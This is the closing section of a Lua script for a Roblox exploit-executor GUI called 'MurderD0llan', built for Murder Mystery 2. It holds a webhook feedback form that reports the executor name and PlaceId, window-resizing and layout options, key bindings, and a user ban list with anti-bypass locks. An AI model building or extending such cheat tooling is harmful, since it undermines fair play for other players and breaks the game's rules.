				updateButtonText("Wait before sending again.")
				task.wait(2)
				updateButtonText("Submit Feedback")
				return
			end

			isOnCooldown = true
			updateButtonText("Sending...")

			-- Safe Executor Identifier
			local executorName = (identifyexecutor and identifyexecutor())
				or (getexecutorname and getexecutorname())
				or "Unidentifiable executor"

			local data = {
				content = "**📝 New Feedback Submitted**",
				embeds = {{
					title = "⭐ Rating: " .. tostring(rating),
					description = message ~= "" and message or "No additional comments.",
					color = 0xAA00FF,
					fields = {
						{
							name = "🔍 Executor",
							value = executorName,
							inline = true
						},
						{
							name = "🧩 PlaceId",
							value = tostring(game.PlaceId),
							inline = true
						}
					},
					footer = {
						text = "Feedback | " .. os.date("%Y-%m-%d %H:%M:%S")
					}
				}}
			}

			local success, response = pcall(function()
				return httprequest({
					Url = webhook,
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = HttpService:JSONEncode(data)
				})
			end)

			if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
				updateButtonText("✅ Sent!")
				sucessnotify("Your feedback was sent successfully!")
				setWebhookStatusColor(true)
			else
				updateButtonText("❌ Failed")
				errornotify("Webhook failed. The feedback couldn't be sent.")
				setWebhookStatusColor(false)
			end

			task.delay(cooldown, function()
				isOnCooldown = false
				updateButtonText("Submit Feedback")
			end)
		end

		SendFeedBack.MouseButton1Click:Connect(send)

		-- 🔎 Check Webhook on Load
		task.delay(1, function()
			local success = pcall(function()
				return httprequest({
					Url = webhook,
					Method = "GET" -- HEAD often fails, GET is safer to verify existence
				})
			end)
			setWebhookStatusColor(success)
		end)
	end)

	for _, button in pairs(script.Parent.MainWindow.ContentArea.Pages:GetChildren()) do
		if button:IsA("TextButton") then
			button.MouseButton1Click:Connect(function()
				script.Parent.MainWindow.ContentArea.ALT_page_feedback.Visible = false --hide alt pages
			end)
		end
	end

	local option_page = script.Parent.MainWindow.ContentArea.ALT_page_options
	local IsReSiZeToolActive = false
	option_page.ReSiZeTool.MouseButton1Click:Connect(function()
		IsReSiZeToolActive = not IsReSiZeToolActive
		if IsReSiZeToolActive then
			option_page.ReSiZeTool.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			if script.Parent.MainWindow:FindFirstChild("ResizeGrip") then
				script.Parent.MainWindow.ResizeGrip.Visible = true
			else
				task.spawn(function()
					local UserInputService = game:GetService("UserInputService")

					local screenGui = script.Parent
					local mainWindow = screenGui:WaitForChild("MainWindow")

					-- Original MIN_WIDTH and MIN_HEIGHT in pixels
					local MIN_WIDTH_PIXELS = 150
					local MIN_HEIGHT_PIXELS = 100

					-- Initialize UIScale and determine designAbsoluteSize (size at Scale = 1)
					local windowScaler = mainWindow:FindFirstChild("MainWindowScaler")
					local designAbsoluteSize

					if windowScaler and windowScaler:IsA("UIScale") then
						if windowScaler.Scale ~= 0 then
							designAbsoluteSize = mainWindow.AbsoluteSize / windowScaler.Scale
						else
							warn("ResizeMainWindow: MainWindowScaler had a scale of 0. Resetting to 1.")
							windowScaler.Scale = 1
							designAbsoluteSize = mainWindow.AbsoluteSize -- mainWindow.AbsoluteSize is now size at scale 1
						end
					else
						windowScaler = Instance.new("UIScale")
						windowScaler.Name = "MainWindowScaler"
						windowScaler.Parent = mainWindow
						-- UIScale defaults to Scale = 1, so AbsoluteSize is already the size at scale 1
						designAbsoluteSize = mainWindow.AbsoluteSize
					end

					-- Calculate minimum allowed scale based on pixel minimums and design size
					local ACTUAL_MIN_SCALE
					if designAbsoluteSize.X > 0 and designAbsoluteSize.Y > 0 then
						local minScaleX = MIN_WIDTH_PIXELS / designAbsoluteSize.X
						local minScaleY = MIN_HEIGHT_PIXELS / designAbsoluteSize.Y
						ACTUAL_MIN_SCALE = math.max(minScaleX, minScaleY)
					else
						-- Fallback if designAbsoluteSize is zero (should not happen for a visible window)
						warn("ResizeMainWindow: designAbsoluteSize is zero. Using a default min scale.")
						ACTUAL_MIN_SCALE = 0.1 
					end
					-- Ensure ACTUAL_MIN_SCALE is at least a very small positive number
					ACTUAL_MIN_SCALE = math.max(ACTUAL_MIN_SCALE, 0.05) -- Absolute smallest scale

					-- Create Resize Grip (if it doesn't exist, or ensure it's configured)
					local resizeGrip = mainWindow:FindFirstChild("ResizeGrip")
					if not resizeGrip or not resizeGrip:IsA("TextButton") then
						if resizeGrip then resizeGrip:Destroy() end -- Remove if wrong type
						resizeGrip = Instance.new("TextButton")
						resizeGrip.Name = "ResizeGrip"
						resizeGrip.Text = "" 
						resizeGrip.Size = UDim2.new(0, 20, 0, 20) 
						resizeGrip.AnchorPoint = Vector2.new(1, 1) 
						resizeGrip.Position = UDim2.new(1, 0, 1, 0) 
						resizeGrip.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
						resizeGrip.BorderColor3 = Color3.fromRGB(80, 80, 80)
						resizeGrip.BorderSizePixel = 1
						resizeGrip.AutoButtonColor = false
						resizeGrip.ZIndex = (mainWindow.ZIndex or 1) + 10 -- Ensure it's on top
						resizeGrip.Parent = mainWindow
					end


					local isResizing = false
					local initialMousePosition = nil
					local initialScalerValue = nil

					resizeGrip.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
							if designAbsoluteSize.X == 0 or designAbsoluteSize.Y == 0 then
								warn("ResizeMainWindow: Cannot start resize, designAbsoluteSize is zero.")
								-- Re-evaluate designAbsoluteSize in case it became valid
								if windowScaler.Scale ~= 0 then
									designAbsoluteSize = mainWindow.AbsoluteSize / windowScaler.Scale
								else
									windowScaler.Scale = 1
									designAbsoluteSize = mainWindow.AbsoluteSize
								end
								if designAbsoluteSize.X == 0 or designAbsoluteSize.Y == 0 then
									return -- Still zero, cannot proceed
								end
							end

							isResizing = true
							initialMousePosition = UserInputService:GetMouseLocation()
							initialScalerValue = windowScaler.Scale
						end
					end)

					UserInputService.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
							if isResizing then
								isResizing = false
								initialMousePosition = nil
								initialScalerValue = nil
							end
						end
					end)

					UserInputService.InputChanged:Connect(function(input)
						if not isResizing or not initialMousePosition or not initialScalerValue then
							return
						end

						if designAbsoluteSize.X == 0 or designAbsoluteSize.Y == 0 then
							-- This check is important if the window was somehow initialized to zero size
							-- and InputBegan couldn't get a valid designAbsoluteSize.
							warn("ResizeMainWindow: Cannot resize, designAbsoluteSize is zero during InputChanged.")
							isResizing = false -- Stop resizing attempt
							return
						end

						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
							local currentMousePosition = UserInputService:GetMouseLocation()
							local delta = currentMousePosition - initialMousePosition

							-- Calculate the absolute size the window had at the start of the drag
							local effectiveWidthAtDragStart = designAbsoluteSize.X * initialScalerValue
							local effectiveHeightAtDragStart = designAbsoluteSize.Y * initialScalerValue

							-- Calculate the new target absolute size based on mouse delta
							local targetAbsoluteWidth = effectiveWidthAtDragStart + delta.X
							local targetAbsoluteHeight = effectiveHeightAtDragStart + delta.Y

							-- Calculate the new scale required to achieve these target absolute sizes,
							-- based on the designAbsoluteSize (size at scale = 1)
							local newScaleX = targetAbsoluteWidth / designAbsoluteSize.X
							-- local newScaleY = targetAbsoluteHeight / designAbsoluteSize.Y -- Kept for reference if aspect ratio logic is desired

							-- For UIScale, we use a single scale value. Let's use the X-axis driven scale.
							-- More complex logic could be used here to maintain aspect ratio or average scales.
							local finalNewScale = newScaleX

							-- Apply minimum scale
							finalNewScale = math.max(ACTUAL_MIN_SCALE, finalNewScale)

							windowScaler.Scale = finalNewScale
						end
					end)
				end)
			end
		else
			script.Parent.MainWindow:FindFirstChild("ResizeGrip").Visible = false
			option_page.ReSiZeTool.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)

	local function ApplyPropertyToEveryScrollingFrame(property, value)
		for _, child in ipairs(script.Parent:GetDescendants()) do
			if child:IsA("ScrollingFrame") and child.Name:find("page_") then
				child[property] = value
			end
		end
	end

	local ActualVerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Right
	option_page.VerticalScrollBarPositionBUTTON.change.MouseButton1Click:Connect(function()
		if ActualVerticalScrollBarPosition == Enum.VerticalScrollBarPosition.Right then
			ApplyPropertyToEveryScrollingFrame("VerticalScrollBarPosition", Enum.VerticalScrollBarPosition.Left)
			ActualVerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
		else
			ApplyPropertyToEveryScrollingFrame("VerticalScrollBarPosition", Enum.VerticalScrollBarPosition.Right)
			ActualVerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Right
		end
	end)

	local alignmentButton = option_page:FindFirstChild("HorizontalAlignment")
	if not alignmentButton or not alignmentButton:IsA("TextButton") then
		warn("No se encontró el botón HorizontalAlignment o no es un TextButton")
		return
	end

	local function ApplyPropertyToEveryUIListLayout(property, value)
		for _, child in ipairs(script.Parent:GetDescendants()) do
			if child:IsA("UIListLayout") and child[property] ~= nil then
				child[property] = value
			end
		end
	end

	local ActualHorizontalAlignment = Enum.HorizontalAlignment.Center

	alignmentButton.change.MouseButton1Click:Connect(function()
		if ActualHorizontalAlignment == Enum.HorizontalAlignment.Center then
			ApplyPropertyToEveryUIListLayout("HorizontalAlignment", Enum.HorizontalAlignment.Left)
			ActualHorizontalAlignment = Enum.HorizontalAlignment.Left
		else
			ApplyPropertyToEveryUIListLayout("HorizontalAlignment", Enum.HorizontalAlignment.Center)
			ActualHorizontalAlignment = Enum.HorizontalAlignment.Center
		end
	end)
	local IsActiveISTool = false
	local ISTool = option_page.ISTool
	local IsActiveISToolF = ISTool.Frame
	ISTool.MouseButton1Click:Connect(function()
		IsActiveISTool = not IsActiveISTool
		if IsActiveISTool then
			IsActiveISToolF.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		else
			IsActiveISToolF.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

		end
		script.Parent.MainWindow.searchHere.Visible = IsActiveISTool
	end)


	local parent = script.Parent.MainWindow.ContentArea -- Cambia esto si tu parent está en otro lugar

	-- Recolecta todos los ScrollingFrames
	local scrollingFrames = {}
	for _, descendant in ipairs(parent:GetDescendants()) do
		if descendant:IsA("ScrollingFrame") then
			table.insert(scrollingFrames, descendant)
		end
	end

	-- Conexión a cambios de visibilidad
	for _, frame in ipairs(scrollingFrames) do
		frame:GetPropertyChangedSignal("Visible"):Connect(function()
			if frame.Visible then
				for _, otherFrame in ipairs(scrollingFrames) do
					if otherFrame ~= frame then
						otherFrame.Visible = false
					end
				end
			end
		end)
	end




	task.spawn(function()
		-- LocalScript inside: game.StarterGui.MurderD0llan.MainWindow.ContentArea.LockScript.LocalScript

		local TweenService = game:GetService("TweenService")

		local lockScript = script.Parent.MainWindow.ContentArea.LockScript
		local textLabel = lockScript:WaitForChild("TextLabel")
		local textBox = lockScript:WaitForChild("TextBox")
		local contentArea = script.Parent.MainWindow.ContentArea
		local mainWindow = script.Parent.MainWindow -- MainWindow
		local sound = Instance.new("Sound", lockScript)
		sound.SoundId = "rbxassetid://4026367629"
		sound.Volume = 1

		-- Window position constants
		local WINDOW_SIZE = UDim2.new(0, 483, 0, 259)
		local WINDOW_INITIAL_POS = UDim2.new(0.5, -WINDOW_SIZE.X.Offset / 2, 0.5, -WINDOW_SIZE.Y.Offset / 2)

		-- Tween settings
		local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)

		-- Frame transparency target (default is 0.4, fade in from 1 to 0.4)
		local function fadeInUI()
			local textLabelTween = TweenService:Create(textLabel, tweenInfo, {Transparency = 0})
			local textBoxTween = TweenService:Create(textBox, tweenInfo, {Transparency = 0})
			local frameTween = TweenService:Create(lockScript, tweenInfo, {BackgroundTransparency = 0.4})

			textLabelTween:Play()
			textBoxTween:Play()
			frameTween:Play()
		end

		local function fadeOutUI()
			local textLabelTween = TweenService:Create(textLabel, tweenInfo, {Transparency = 1})
			local textBoxTween = TweenService:Create(textBox, tweenInfo, {Transparency = 1})
			local frameTween = TweenService:Create(lockScript, tweenInfo, {BackgroundTransparency = 1})

			textLabelTween:Play()
			textBoxTween:Play()
			frameTween:Play()
		end

		-- Update lock state
		local function updateLock()
			local systemMessage = lockScript:GetAttribute("SYSTEM_MESSAGE")
			local isBanned = lockScript:GetAttribute("BAN")
			local isError = lockScript:GetAttribute("ERROR")

			if isBanned or isError then
				-- Lock active
				contentArea.Interactable = false
				lockScript.Visible = true

				-- Message
				if isBanned then
					textLabel.Text = "This script has been disabled for you. The system has left a message:"
				elseif isError then
					textLabel.Text = "A system error occurred. The system has left a message:"
				else
					textLabel.Text = "This script has been locked. System message:"
				end

				textBox.Text = systemMessage or "No system message was provided."

				-- Play UI animation and sound
				TweenService:Create(mainWindow, tweenInfo, {Position = WINDOW_INITIAL_POS}):Play()
				fadeInUI()
				sound:Play()

			else
				-- Lock inactive
				contentArea.Interactable = true
				fadeOutUI()

				-- Optional: delay before hiding to allow fade-out to finish
				task.delay(0.6, function()
					if not lockScript:GetAttribute("BAN") and not lockScript:GetAttribute("ERROR") then
						lockScript.Visible = false
					end
				end)
			end
		end

		-- Initial state
		updateLock()

		-- Listen to attribute changes
		lockScript:GetAttributeChangedSignal("BAN"):Connect(updateLock)
		lockScript:GetAttributeChangedSignal("ERROR"):Connect(updateLock)
		lockScript:GetAttributeChangedSignal("SYSTEM_MESSAGE"):Connect(updateLock)


	end)

	if not game["Run Service"]:IsStudio() then

		local PlaceId = game.PlaceId
		local OfficialGameId = 142823291
		local WaitLongerForBanCheck = false

		-- Only run if not in the official Murder Mystery 2 place
		if PlaceId ~= OfficialGameId then
			WaitLongerForBanCheck = true
			task.delay(3, function()
				script.Parent.MainWindow:SetAttribute("DRAG_ACTIVE", false)
				local marketplace = game:GetService("MarketplaceService")
				local actualGameName = "Unknown Game"
				local success, info = pcall(function()
					return marketplace:GetProductInfo(PlaceId)
				end)

				if success and info and info.Name then
					actualGameName = info.Name
				end

				local targetGameName = "Murder Mystery 2"
				local message = string.format(
					"This script can only run in the official Murder Mystery 2 game.\n" ..
						"Running this script in other games may cause most LocalScripts to fail.\n" ..
						"Current game: %s\nExpected: %s\n" ..
						"(this message will close in 5 seconds)",
					actualGameName, targetGameName
				)

				local lockScript = script.Parent.MainWindow.ContentArea.LockScript

				-- Set lock attributes
				lockScript:SetAttribute("SYSTEM_MESSAGE", message)
				lockScript:SetAttribute("ERROR", true)

				-- Optional: Auto-remove lock after 5 seconds
				task.delay(5, function()
					script.Parent.MainWindow:SetAttribute("DRAG_ACTIVE", true)
					lockScript:SetAttribute("ERROR", false)
					lockScript:SetAttribute("SYSTEM_MESSAGE", "")
				end)
			end)
		end

		task.delay((WaitLongerForBanCheck and 9 or 3), function()
			local Reasons = {
				[1] = "Insulted the owner due to bugs in the script.",
				[2] = "Unauthorized redistribution of the script before being published.",
				[3] = "Spreading negative opinions about the script without constructive feedback.",
				[4] = "Toxic behavior or threats toward the owner or contributors without justification.",
				[5] = "Unknown reason / The player has performed actions that the script owner sees as justification for a ban.",
				[6] = "Stole or replicated significant parts of the script's code without permission.",
				[7] = "Leaked private or early versions of the script to the public.",
				[8] = "Falsely claiming authorship or official affiliation with the script.",
				[9] = "Repeatedly requesting features already denied, while being disrespectful.",
				[10] = "Persistent harassment or spamming of the development/support team.",

			}


			local FLAGGED_USERS_IDS = {
				--["123456789"] = 0, -- ID como string, razón como numero de índice
			}

			local userIdStr = tostring(game:GetService("Players")["LocalPlayer"].UserId)
			local reasonIndex = FLAGGED_USERS_IDS[userIdStr]

			if reasonIndex then
				local reasonText = Reasons[reasonIndex] or "You have been banned from using this script."

				local lockScript = script.Parent.MainWindow.ContentArea.LockScript
				lockScript:SetAttribute("SYSTEM_MESSAGE", "You are banned from using this script.\nReason: " .. reasonText)
				lockScript:SetAttribute("BAN", true)

				--anti bypass
				lockScript:GetAttributeChangedSignal("BAN"):Connect(function()
					if not lockScript:GetAttribute("BAN") then
						-- Reapply ban if removed
						lockScript:SetAttribute("BAN", true)
					end
				end)

				lockScript:GetAttributeChangedSignal("SYSTEM_MESSAGE"):Connect(function()
					if lockScript:GetAttribute("SYSTEM_MESSAGE") ~= "You are banned from using this script.\nReason: " .. reasonText then
						-- Reset message if changed
						lockScript:SetAttribute("SYSTEM_MESSAGE", "You are banned from using this script.\nReason: " .. reasonText)
					end
				end)
				local AntiBY = function()
					script.Parent.MainWindow.TitleBar.TitleLabel.Text = "MurderD0llan / Holy SHI trying to evade the ban bro... Won't you give up?"
					local ABSound = Instance.new("Sound", script.Parent)
					ABSound.SoundId = "rbxassetid://4041673253"
					ABSound:Play()
					w()
					script.Parent.MainWindow.ACTIVATE_CLOSE:SetAttribute("CHANGE_TO_TRIGGER", true)
				end
				lockScript.ChildRemoved:Connect(AntiBY)
				lockScript.AncestryChanged:Connect(function(child, parent)
					if not parent then
						AntiBY()
					end
				end)
				script.Parent.MainWindow.ContentArea:GetPropertyChangedSignal("Interactable"):Connect(function()
					if script.Parent.MainWindow.ContentArea.Interactable == true then
						script.Parent.MainWindow.ContentArea.Interactable = false
					end
				end)
			end
		end)
	end
	script.Parent.MainWindow.ContentArea.ALT_page_options.faq.MouseButton1Click:Connect(function()
		script.Parent.MainWindow.ContentArea.ALT_page_options.Visible = false
		script.Parent.MainWindow.ContentArea.ALT_page_FAQ.Visible = true
	end)

	---------------------------------


	local Notification_Service = require(script.Parent:FindFirstChild("NotificationService"))
	local Notificaciones = {
		Error = "rbxassetid://4041673253",
		Aviso = "rbxassetid://4026367629",
		Correcto = "rbxassetid://4094488012",
	}
	local function errornotify(text)
		Notification_Service.ShowNotification({
			title = "Error / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Error,
			theme = "Error"
		})
	end

	local function sucessnotify(text)
		Notification_Service.ShowNotification({
			title = "Success / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Correcto,
			theme = "Success"
		})
	end

	local function warningnotify(text)
		Notification_Service.ShowNotification({
			title = "Warning / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Aviso,
			theme = "Warning"
		})
	end


	local KeyListenerPage = script.Parent.MainWindow.ContentArea.ALT_page_keylistener
	local Key_Listener_Module = require(script.Parent.HelpModules.KeyBindBTNModule)
	local SelectionModeModule = require(script.Parent.HelpModules.ButtonSelectorModule)
	local KeySelectionModule = require(script.Parent.HelpModules.KeySelectorModule)
	local ACTIVE_KEY_LISTENERS = {}

	local WorkOnlyWhenGuiHidden = KeyListenerPage.onlyworkwhenguihiden
	local SelectionModeButton = KeyListenerPage.TemplateButton

	-- 🔄 Bandera para saber si está activo el modo de selección
	local isSelecting = false

	SelectionModeButton.MouseButton1Click:Connect(function()
		local gui = script.Parent
		local exclusions = {
			gui.MainWindow,
			gui.MainWindow.ContentArea,
			gui.MainWindow.ContentArea.ALT_page_keylistener,
			gui.MainWindow.ContentArea.ALT_page_search,
			gui.MainWindow.ContentArea.ALT_page_feedback,
			gui.MainWindow.ContentArea.Pages,
		}

		if isSelecting then
			-- 🔴 Cancelar modo si ya está activo
			isSelecting = false
			if SelectionModeModule.Stop then
				SelectionModeModule.Stop()
			end
			if KeySelectionModule.Cancel then
				KeySelectionModule.Cancel()
			end
			return
		end

		-- 🟢 Activar modo
		isSelecting = true

		SelectionModeModule.Start(gui, exclusions, function()
			SelectionModeButton.Text = "stop Selection Mode  "
		end, function(button)
			-- Cuando el usuario selecciona un botón con click derecho
			KeySelectionModule.Start(function(key)
				-- Al seleccionar una tecla, se asigna el key listener
				AddKeyListener(key, button)
				isSelecting = false
				SelectionModeButton.Text = "Start Selection Mode  "
			end)
		end)
	end)
	-- Cambia el color del indicador y el estado del módulo
	WorkOnlyWhenGuiHidden.MouseButton1Click:Connect(function()
		Key_Listener_Module.set_WWGIH_Bool(not Key_Listener_Module.get_WWGIH_Bool())
		if Key_Listener_Module.get_WWGIH_Bool() then
			WorkOnlyWhenGuiHidden.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		else
			WorkOnlyWhenGuiHidden.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)

	-- Función para crear el template visual de un key listener
	local function generate_template_for_key_listener(conditionalnumber: string?, keyname: string?, executetext: string?)
		local generated_template = KeyListenerPage["template"]:Clone()
		generated_template.Text = string.format([[[%s Key Listener] key: "%s", executes: "%s"]], conditionalnumber or "1", keyname or "?", executetext or "?")
		generated_template.Parent = KeyListenerPage
		generated_template.Visible = true

		-- Hover color efecto
		local btn = generated_template:FindFirstChild("ClickForRemove")
		if btn then
			btn.MouseEnter:Connect(function()
				btn.Parent.TextColor3 = Color3.fromRGB(255, 200, 200)
			end)
			btn.MouseLeave:Connect(function()
				btn.Parent.TextColor3 = Color3.fromRGB(255, 255, 255)
			end)
			btn.MouseButton1Click:Connect(function()
				RemoveKeyListener(keyname)
			end)
		end

		return generated_template
	end

	-- Agrega un key listener
	function AddKeyListener(key, button)
		if not key or not button then errornotify("missing key / button Arg") return end
		if ACTIVE_KEY_LISTENERS[key] then errornotify("There is currently a KeyListener with the specified key, cannot proceed.")return end -- Ya existe

		local template = generate_template_for_key_listener(tostring(#ACTIVE_KEY_LISTENERS + 1), key, button.Name)

		-- Guardar en la tabla
		ACTIVE_KEY_LISTENERS[key] = {
			key = key,
			executes = button,
			generated_template_for_key = template
		}

		-- Conectar la tecla
		Key_Listener_Module.connect(key, button, function()
			errornotify("The environment identifies firesignal() as UnknownGlobal, cannot proceed.")
		end)
	end

	-- Elimina un key listener
	function RemoveKeyListener(key)
		local data = ACTIVE_KEY_LISTENERS[key]
		if not data then return end

		-- Desconectar
		Key_Listener_Module.disconnect(key)

		-- Remover template GUI
		if data.generated_template_for_key then
			data.generated_template_for_key:Destroy()
		end

		-- Remover de la tabla
		ACTIVE_KEY_LISTENERS[key] = nil
	end

	-- 🔽 Ejemplo de uso
	--local exampleButton = script.Parent.MainWindow.ContentArea.ExampleButton -- Asegúrate de que este botón exista
	--AddKeyListener("G", exampleButton)



	local UserInputService = game:GetService("UserInputService")

	if UserInputService.TouchEnabled then
		KeyListenerPage:GetPropertyChangedSignal("Visible"):Connect(function()
			if KeyListenerPage.Visible == true then
				warningnotify("Remember that this page is only for computers!")
			end
		end)
	end

	script.Parent.MainWindow.ContentArea.ALT_page_options.KeyListener.MouseButton1Click:Connect(function()
		KeyListenerPage.Visible = true
		script.Parent.MainWindow.ContentArea.ALT_page_options.Visible = false
	end)

	local IsTranslated = false
	local TranslationModule = require(script.Parent.HelpModules.TranslatorModule)

	local translateButton = script.Parent.MainWindow.ContentArea.ALT_page_options.translategui
	local statusText = script.Parent.MainWindow.ContentArea.ALT_page_options.translategui -- Asumo que quieres cambiar el mismo botón, cambia si no es el caso

	translateButton.change.MouseButton1Click:Connect(function()
		if not IsTranslated then
			IsTranslated = true
			statusText.Text = "  Trying To Translate..."

			local success, err = TranslationModule.TranslateGui(script.Parent)
			if success then
				statusText.Text = "  Translated (click again to undo)"
			else
				statusText.Text = "  Failed To Translate"
				errornotify(err)
				IsTranslated = false
			end
		else
			-- Deshacer traducción
			TranslationModule.UndoTranslation(script.Parent)
			statusText.Text = "  Translation UnDone"
			IsTranslated = false
			task.delay(1, function()
				statusText.Text = "  Try To Translate Script GUI"
			end)
		end
	end)

	------------------------------------------------------------
	-- Aplicar tema al iniciar
	SelectThemeAndApply("original")

end;
task.spawn(C_1d4);

return G2L["1"], require;
